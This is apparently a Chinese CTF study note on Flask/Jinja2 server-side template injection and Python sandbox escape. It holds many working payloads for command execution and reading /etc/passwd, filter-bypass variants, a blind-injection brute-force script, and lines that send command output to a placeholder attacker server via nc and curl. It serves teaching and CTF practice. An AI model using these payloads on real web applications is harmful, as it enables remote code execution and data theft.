# ssti-sandbox-bypass
bytes2021 wait for it‘s wp

python-Flask模版注入攻击SSTI(python沙盒逃逸)
-

flask使用：

```python
from flask import Flask

app = Flask(__name__)

@app.route('/admin')
def helloworld():
   return "hack for fun"

if __name__ == '__main__':
   app.run()
```
模板渲染引擎jinjia2中的变量：

控制结构 {% %}

变量取值 {{ }}

注释 {# #}

jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等

inja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。

被两个括号包裹的内容会输出其表达式的值

ssti中我们需要关注的渲染方法和模板
-
flask的渲染方法有render_template和render_template_string两种

render_template()用来渲染指定的文件:

return render_template('index.html')

render_template_string则是用来渲染字符串

html = '<h1>This is a String</h1>'

return render_template_string(html)

模板

flask使用Jinja2来作为渲染引擎的

在网站的根目录下新建templates文件夹，这里是用来存放html文件。也就是模板文件。

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011203939546-600271618.png)

qing.html:

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011204008068-1274656139.png)

访问localhost/qing 后flask会渲染出模版:

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011204058614-56274957.png)

而在我们SSTI注入场景中模版都是有变量进行渲染的。

例如我这里渲染方法进行传参 模版进行动态的渲染

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011204058614-56274957.png)

```python
from flask import Flask,url_for,redirect,render_template,render_template_string

app = Flask(__name__)

@app.route('/qing')
def hello_world():
    return render_template('qing.html',string="qing qing qing")

if __name__ == '__main__':
    app.run()

```

qing.html：

```python

复制代码
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Flask</title>
</head>
<body>
<h1>{{string}}</h1>
</body>
</html>

```

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011204512073-660172296.png)

python沙盒逃逸
-

这次的字节跳动比赛出了一道沙盒逃逸的jfinal，一开始以为进去后是文件上传结果，后来提示沙盒逃逸

沙箱：

沙箱是一种按照安全策略限制程序行为的执行环境。早期主要用于测试可疑软件等，比如黑客们为了试用某种病毒或者不安全产品，往往可以将它们在沙箱环境中运行。
　　经典的沙箱系统的实现途径一般是通过拦截系统调用，监视程序行为，然后依据用户定义的策略来控制和限制程序对计算机资源的使用，比如改写注册表，读写磁盘等。

沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。

socat

概述

socat，是linux下的一个工具，其功能与有“瑞士军刀”之称的netcat类似，不过据说可以看做netcat的加强版。的确如此，它有一些netcat所不具备却又很有需求的功能，例如ssl连接这种。nc可能是因为比较久没有维护，确实显得有些陈旧了。

安装

Ubuntu上可以直接sudo apt-get install socat，其他发行版没试过。

也可以去官网下载源码包socat link :http://www.dest-unreach.org/socat/

内建名称空间 builtins

在启动Python解释器之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，这些函数就是内建函数，并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，这个有文章里面有介绍，他有很多层的命名空间这个是刚开始自带最底层的那个。等我把我笔记都更上来就有了

​ 名称空间

它是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间

内建名称空间

全局名称空间

还有介绍的就是python中的重要的魔术方法，这块很烦之前学的时候，我一度以为这些函数是flask里面特有的，导致我学的时候一脸懵逼，百度直接搜出来的那些前几名的都没说这个函数哪来的，就很淦

__base__ //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法

__mro__ //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到

__subclasses__() //继承此对象的子类，返回一个列表

_class__ 返回类型所属的对象
 
__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 

__base__ 返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的 

__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 

__init__ 类的初始化方法 

__globals__ 对包含函数全局变量的字典的引用

__dict__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里的,对象的__dict__中存储了一些self.xxx的一些东西,内置的数据类型没有__dict__属性,每个类有自己的__dict__属性，就算存在继承关系，父类的__dict__ 并不会影响子类的__dict__对象也有自己的__dict__属性， 存储self.xxx 信息，父子类对象公用__dict__

__globals__ 该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。

__getattribute__()实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性

如何才能在python环境下，不直接使用open而来打开一个文件？

这里运用我们上面介绍的方法，从任意一个变量中回溯到基类，再去获得基类实现的文件类就可以实现。

```python
// python2
>>> ''.__class__
<type 'str'>
>>> ''.__class__.__mro__
(<type 'str'>, <type 'basestring'>, <type 'object'>)
>>> ''.__class__.__mro__[-1].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteCodec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <type 'MultibyteStreamWriter'>]

//查阅起来有些困难，来列举一下
>>> for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
...
(0, <type 'type'>)
(1, <type 'weakref'>)
(2, <type 'weakcallableproxy'>)
(3, <type 'weakproxy'>)
(4, <type 'int'>)
(5, <type 'basestring'>)
(6, <type 'bytearray'>)
(7, <type 'list'>)
(8, <type 'NoneType'>)
(9, <type 'NotImplementedType'>)
(10, <type 'traceback'>)
(11, <type 'super'>)
(12, <type 'xrange'>)
(13, <type 'dict'>)
(14, <type 'set'>)
(15, <type 'slice'>)
(16, <type 'staticmethod'>)
(17, <type 'complex'>)
(18, <type 'float'>)
(19, <type 'buffer'>)
(20, <type 'long'>)
(21, <type 'frozenset'>)
(22, <type 'property'>)
(23, <type 'memoryview'>)
(24, <type 'tuple'>)
(25, <type 'enumerate'>)
(26, <type 'reversed'>)
(27, <type 'code'>)
(28, <type 'frame'>)
(29, <type 'builtin_function_or_method'>)
(30, <type 'instancemethod'>)
(31, <type 'function'>)
(32, <type 'classobj'>)
(33, <type 'dictproxy'>)
(34, <type 'generator'>)
(35, <type 'getset_descriptor'>)
(36, <type 'wrapper_descriptor'>)
(37, <type 'instance'>)
(38, <type 'ellipsis'>)
(39, <type 'member_descriptor'>)
(40, <type 'file'>)
(41, <type 'PyCapsule'>)
(42, <type 'cell'>)
(43, <type 'callable-iterator'>)
(44, <type 'iterator'>)
(45, <type 'sys.long_info'>)
(46, <type 'sys.float_info'>)
(47, <type 'EncodingMap'>)
(48, <type 'fieldnameiterator'>)
(49, <type 'formatteriterator'>)
(50, <type 'sys.version_info'>)
(51, <type 'sys.flags'>)
(52, <type 'sys.getwindowsversion'>)
(53, <type 'exceptions.BaseException'>)
(54, <type 'module'>)
(55, <type 'imp.NullImporter'>)
(56, <type 'zipimport.zipimporter'>)
(57, <type 'nt.stat_result'>)
(58, <type 'nt.statvfs_result'>)
(59, <class 'warnings.WarningMessage'>)
(60, <class 'warnings.catch_warnings'>)
(61, <class '_weakrefset._IterationGuard'>)
(62, <class '_weakrefset.WeakSet'>)
(63, <class '_abcoll.Hashable'>)
(64, <type 'classmethod'>)
(65, <class '_abcoll.Iterable'>)
(66, <class '_abcoll.Sized'>)
(67, <class '_abcoll.Container'>)
(68, <class '_abcoll.Callable'>)
(69, <type 'dict_keys'>)
(70, <type 'dict_items'>)
(71, <type 'dict_values'>)
(72, <class 'site._Printer'>)
(73, <class 'site._Helper'>)
(74, <type '_sre.SRE_Pattern'>)
(75, <type '_sre.SRE_Match'>)
(76, <type '_sre.SRE_Scanner'>)
(77, <class 'site.Quitter'>)
(78, <class 'codecs.IncrementalEncoder'>)
(79, <class 'codecs.IncrementalDecoder'>)
(80, <type 'operator.itemgetter'>)
(81, <type 'operator.attrgetter'>)
(82, <type 'operator.methodcaller'>)
(83, <type 'functools.partial'>)
(84, <type 'MultibyteCodec'>)
(85, <type 'MultibyteIncrementalEncoder'>)
(86, <type 'MultibyteIncrementalDecoder'>)
(87, <type 'MultibyteStreamReader'>)
(88, <type 'MultibyteStreamWriter'>)

//可以发现索引号为40指向file类，此类存在open方法
>>> ''.__class__.__mro__[-1].__subclasses__()[40]("C:/Users/TPH/Desktop/test.txt").read()
'This is a test!'
```
![](https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8vv7KaA050aUefyTRxicXz0yD20EYGCMcy7STZbbXYsbHaVPTIibObUcNczprlmoWSjVI6ibpeFw723w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

有这些类继承的方法，我们就可以从任何一个变量，顺藤摸瓜到基类中去，再获得到此基类所有实现的类，然后再通过实现类调用相应的成员变量函数 这里就是沙盒逃逸的基本流程了。ssti注入好像实战中应该见不到，都是ctf里面才会出的，应该是。根据上面提到的类继承的知识，我们可以总结出一个利用方式（这也是python沙盒溢出的关键）：从变量->对象->基类->子类遍历->全局变量 这个流程中，找到我们想要的模块或者函数

0x02 利用方式
遇上一个SSTI的题，该如何下手？大体上有以下两种思路，简单介绍一下，后续有详细总结。

查配置文件

命令执行（其实就是沙盒逃逸类题目的利用方式）。

什么是查配置文件？我们都知道一个python框架，比如说flask，在框架中内置了一些全局变量，对象，函数等等。我们可以直接访问或是调用。这里拿两个例题来简单举例：

easy_tornado

这个题目发现模板注入后的一个关键考点在于handler.settings。这个是Tornado框架本身提供给程序员可快速访问的配置文件对象之一。分析官方文档可以发现handler.settings其实指向的是RequestHandler.application.settings，即可以获取当前application.settings，从中获取到敏感信息。

shrine

这个题目直接给出了源码，flag被写入了配置文件中

app.config['FLAG'] = os.environ.pop('FLAG')

同样在此题的Flask框架中，我们可以通过内置的config对象直接访问该应用的配置信息。不过此题设置了WAF，并不能直接访问{{config}}得到配置文件而是需要进行一些绕过。这个题目很有意思，开拓思路，有兴趣可以去做一下。

总结一下这类题目，为了内省框架，我们应该：

查阅相关框架的文档

使用dir内省locals对象来查看所有能够使用的模板上下文

使用dir深入内省所有对象

直接分析框架源码

这里发掘到一个2018TWCTF-Shrine的writeup，内省request对象的例子：传送门(https://ctftime.org/writeup/10851)

ps:如果需要例题实践请移步BUUCTF(https://buuoj.cn/)

命令执行
命令执行，其实就是前面我们介绍的沙盒溢出的操作。在python环境下，由于在SSTI发生时，以Jinja2为例，在渲染的时候会把{{}}包裹的内容当做变量解析替换，在{{}}包裹中我们插入''.__class__.__mro__[-1].__subclasses__()[40]类似的payload也能够被先解析而后结果字符串替换成模板中的具体内容。

![](https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8vv7KaA050aUefyTRxicXz0ysicbzE4lfBzCeAVdIibYK5YvjUVKdbic3e4yKjDs21wYYnTClDCRbYJSw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

0x03 python环境常用命令执行方式
前面提到了命令执行，那么就有必要了解一下python环境下常用的命令执行方式。

os.system()
用法：os.system(command)

这个调用相当直接，且是同步进行的，程序需要阻塞并等待返回。返回值是依赖于系统的，直接返回系统的调用返回值。

注意：该函数返回命令执行结果的返回值，并不是返回命令的执行输出（执行成功返回0，失败返回-1）

关于linux下os.system()返回值说明(https://blog.csdn.net/lwgkzl/article/details/81060016)

![](https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8vv7KaA050aUefyTRxicXz0yu30x5CibuzceXwXEv46sw3aEbqv5wdKbw4hfuk3H5JRG4LPibskOWd9g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

os.popen()
用法：os.popen(command[,mode[,bufsize]])

说明：mode – 模式权限可以是 ‘r’(默认) 或 ‘w’。

popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。

![](https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8vv7KaA050aUefyTRxicXz0yeLWj2UAnkRHVftOYQibwrqnweozgKADaWXdTq97mnX0z2WXlwqrvDLg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

subprocess
subprocess 模块有比较多的功能，subprocess模块被推荐用来替换一些老的模块和函数，如：os.system、os.spawn、os.popen等

subprocess模块目的是启动一个新的进程并与之通信。这里只讲用来运行shell命令的两个常用方法。

subprocess.call(“command”)
父进程等待子进程完成
返回退出信息(returncode，相当于Linux exit code)

与os.system功能相似,也无执行结果的回显

subprocess.Popen(“command”)

说明：class subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)

Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息。

0x04 如何发掘可利用payload
最初接触SSTI的时候总会有一个固定思维，遇到了题就去搜SSTI的payload，然后一个个去套，随缘写题法（×）。然而每个题都是有自己独特的一个考点的并且python环境不同，所能够使用的类也有差异，如果不能把握整体的原理，就不能根据具体题目来进行解题了。这里我们来初探一下发掘步骤。

比如我们想要一个执行命令的payload，如何查找？很简单我们只需要有os模块执行os.system即可

python2
```python
#python2
num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    try:
        if 'os' in item.__init__.__globals__:
            print num,item
        num+=1
    except:
        num+=1

#72 <class 'site._Printer'>
#77 <class 'site.Quitter'>
```
payload

''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('ls')

[].__class__.__base__.__subclasses__()[72].__init__.__globals__['os'].popen('ls').read()

查阅资料发现访问os模块还有从warnings.catchwarnings模块入手的，而这两个模块分别位于元组中的59，60号元素。__init__方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者`__globals`）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。

于是还可以挖掘到类似payload（注意payload都不是直接套用的，不同环境请自行测试
我们除了知道了linecache、os可以获取到命令执行的函数以外，我们前面还提到了一个__builtins__内建函数，在python的内建函数中我们也可以获取到诸如eval等执行命令的函数。于是我们可以改动一下脚本，看看python2还有哪些payload可以用：

补充一下关于__builtin__和__builtins__的区别：传送门(https://www.cnblogs.com/Ladylittleleaf/p/10240096.html)

```python

num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    #print item
    try:
        if item.__init__.__globals__.keys():

            if '__builtins__' in  item.__init__.__globals__.keys():
                print(num,item,'__builtins__')
            if  'os' in  item.__init__.__globals__.keys():
                print(num,item,'os')
            if  'linecache' in  item.__init__.__globals__.keys():
                print(num,item,'linechache')

        num+=1
    except:
        num+=1

```

结果如下：
```python
(59, <class 'warnings.WarningMessage'>, '__builtins__')
(59, <class 'warnings.WarningMessage'>, 'linechache')
(60, <class 'warnings.catch_warnings'>, '__builtins__')
(60, <class 'warnings.catch_warnings'>, 'linechache')
(61, <class '_weakrefset._IterationGuard'>, '__builtins__')
(62, <class '_weakrefset.WeakSet'>, '__builtins__')
(72, <class 'site._Printer'>, '__builtins__')
(72, <class 'site._Printer'>, 'os')
(77, <class 'site.Quitter'>, '__builtins__')
(77, <class 'site.Quitter'>, 'os')
(78, <class 'codecs.IncrementalEncoder'>, '__builtins__')
(79, <class 'codecs.IncrementalDecoder'>, '__builtins__')
```
我们可以看到在这些能够通过初始化函数来获取到全局变量值的，（很多都不能获取到全局变量的值，可以自行去尝试一下）我们都可以索引到内建函数。在内建函数中可以根据需要利用import导入库、eval导入库执行命令等等操作，这里的操作空间就很广了。（然而实际的CTF中沙盒溢出题呢？在它的内建函数往往会被阉割，这个时候就需要各种Bypass操作）

我们可以看到在这些能够通过初始化函数来获取到全局变量值的，（很多都不能获取到全局变量的值，可以自行去尝试一下）我们都可以索引到内建函数。在内建函数中可以根据需要利用import导入库、eval导入库执行命令等等操作，这里的操作空间就很广了。（然而实际的CTF中沙盒溢出题呢？在它的内建函数往往会被阉割，这个时候就需要各种Bypass操作）

python3

python3和python2原理都是一样的，只不过环境变化有点大，比如python2下有file而在python3下已经没有了，所以是直接用open。查阅了相关资料发现对于python3的利用主要索引在于__builtins__，找到了它我们就可以利用其中的eval、open等等来执行我们想要的操作。这里改编了一个递归脚本（能力有限，并不够完善..）

```python
def search(obj, max_depth):

    visited_clss = []
    visited_objs = []

    def visit(obj, path='obj', depth=0):
        yield path, obj

        if depth == max_depth:
            return

        elif isinstance(obj, (int, float, bool, str, bytes)):
            return

        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            #print(obj) Enumerates the objects traversed

        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)

        # attributes
        for name in dir(obj):
            try:
                attr = getattr(obj, name)
            except:
                continue
            yield from visit(attr, '{}.{}'.format(path, name), depth + 1)

        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
            except:
                pass

        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)

    yield from visit(obj)


num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    try:
        if item.__init__.__globals__.keys():
            for path, obj in search(item,5):
                if obj in ('__builtins__','os','eval'):
                    print('[+] ',item,num,path)

        num+=1
    except:
        num+=1


```


PS：python2没有自带协程。因此需要在python3下执行。对python3的可利用payload进行测试。

该脚本并不完善，payload不能直接用，请自行测试修改！，obj自行补充。另外pyhon执行命令的方式还有subprocess、command等等，上述脚本只给出了三个关键字的模糊测试。

脚本跑出来bulitins以后还会继续深入递归（继续索引name等获取的是字符串值），请自行选择简短的payload即可。

控制递归深度，挖掘更多payload？

0x05 无回显处理
nc转发
![](https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8vv7KaA050aUefyTRxicXz0yIpYjX1dNcUwCO5qeSUQsAn06fksbjmU0hEwU5xokj9l0GOnY2rpUVg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#vps接收到回显
root@iZwz91vrssa7zn3rzmh3cuZ:~# nc -lvp 44444
Listening on [0.0.0.0] (family 0, port 44444)
Connection from [xx.xxx.xx.xx] port 44444 [tcp/*] accepted (family 2, sport 46258)
app.py
app.pyc
error.html

总之，这里只是提供一个想法，希望能有抛砖引玉效果？有兴趣的读者可以自行多去尝试。网上也没有查阅到更多关于如何深入挖掘的资料。希望懂的大佬能教教小弟。
如果嫌一次一次转发太复杂也可以考虑直接反弹交互型shell。（反弹shell的操作网上也一大堆，这里就不多赘述了，可以参考：https://github.com/0xR0/shellver）

vps：nc -lvp 44444

payload: ''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('ls | nc xx.xxx.xx.xx 44444')

dnslog转发

curl `whoami`.xxxxxx

参考巧用DNSlog实现无回显注入

建立本地文件再读取

这个也很好理解，针对system无回显，直接执行ls > a.txt，再用open进行读取

curl上传文件

这个方法没有实践过，某师傅博客上翻到的，记录一下或许今后就用到了。

无回显代码执行利用方法

盲注{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}~p0~{% endif %}类似SQL布尔注入，通过是否回显~p0~来判断注入是否成功。网上现有脚本如下：

```python
import requests

url = 'http://127.0.0.1:8080/'

def check(payload):
    postdata = {
        'exploit':payload
        }
    r = requests.post(url, data=postdata).content
    return '~p0~' in r

password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$'()*+,-./:;<=>?@[\]^`{|}~'"_%'

for i in xrange(0,100):
    for c in s:
        payload = '{% if "".__class__.__mro__[2].__subclasses__()[40]("/tmp/test").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}~p0~{% endif %}'
        if check(payload):
            password += c
            break
    print password

```

这里记录一下常见的bypass思路

拼接
object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()

编码
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")

等价于

().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=".decode('base64'))(可以看出单双引号内的都可以编码)

同理还可以进行rot13、16进制编码等

过滤中括号[]

getitem()

"".__class__.__mro__[2]
"".__class__.__mro__.__getitem__(2)
pop()

''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()

字典读取

__builtins__['eval']()
__builtins__.eval()
经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行
![](https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8vv7KaA050aUefyTRxicXz0yjyqzcqqNFtbIyRdOej2QQrecT38PVziaQ8pKs9QLfwYtzf42gn6vGeQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

过滤引号
先获取chr函数，赋值给chr，后面拼接字符串

{% set
chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr
%}{{
().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()
}}

或者借助request对象：（这种方法在沙盒种不行，在web下才行，因为需要传参）

{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd

PS：将其中的request.args改为request.values则利用post的方式进行传参

{{
().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read()
}}&cmd=id

过滤双下划线__
{{
''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read()
}}&class=__class__&mro=__mro__&subclasses=__subclasses__

过滤{{

{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}

reload方法
CTF题中沙盒环境可能会阉割一些模块，其中内建函数中多半会被删除。如果reload还可以用则可以重载

del __builtins__.__dict__['__import__']
del __builtins__.__dict__['eval']
del __builtins__.__dict__['execfile']


reload(__builtins__)

__getattribute__方法
这个方法之前介绍过了，获取属性。

[].__class__.__base__.__subclasses__()[60].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__.values()[12]
# 等价于
[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]

更多请参考：传送门1(https://0day.work/jinja2-template-injection-filter-bypasses/)

p师傅也有总结SSTI Bypass(https://p0sec.net/index.php/archives/120/)

 0x07 SSTI控制语句
之前我们测试一些可用payload都是直接在python解释器里测试。如果遇上做题的时候，沙盒溢出能够直接测试都还好，如果遇到SSTI，我们要知道一个python-web框架中哪些payload可用，那一个一个发请求手动测试就太慢，这里就需要用模板的控制语句来写代码操作。

{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}

根据前面提到的发掘步骤，可以自行更改代码直接对题目环境测试。

![](https://mmbiz.qpic.cn/mmbiz_png/1N39PtINn8vv7KaA050aUefyTRxicXz0yN08Sib5IaPrRuHiaVbWHc7aTUibW4QYVDicv8Y0sRmLZUuib0ia7qn6nPZqw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

请参考jinja2控制语句(https://blog.csdn.net/u011377996/article/details/86776181)

0x08 番外操作
不利用__globals__

[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system('ls')
timeit

import timeit
timeit.timeit("__import__('os').system('dir')",number=1)
platform

import platform
print platform.popen('dir').read()
from_object

限于篇幅在此不多赘述，详细请参考：传送门(https://www.freebuf.com/articles/web/98619.html)


此处手动分界线。后文讲解做题会遇到的一些问题
python中一切均为对象，均继承object对象

```python
''.__class__.__mro__[-1] 

>>>[].__class__.__bases__[0]
 
>>><type 'object'> 

>>>''.__class__.__mro__[-1] 

<type 'object'>
```

获取字符串的类对象

''.__class__

<type 'str'>

寻找基类

''.__class__.__mro__

(<type 'str'>, <type 'basestring'>, <type 'object'>)

查看实现类和成员

```python
''.__class__.__mro__[1].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```
例如我要使用os模块执行命令

首先获取 warnings.catch_warnings 在 object 类中的位置

```python
import warnings
[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
60
[].__class__.__base__.__subclasses__()[60]
<class 'warnings.catch_warnings'>
[].__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()
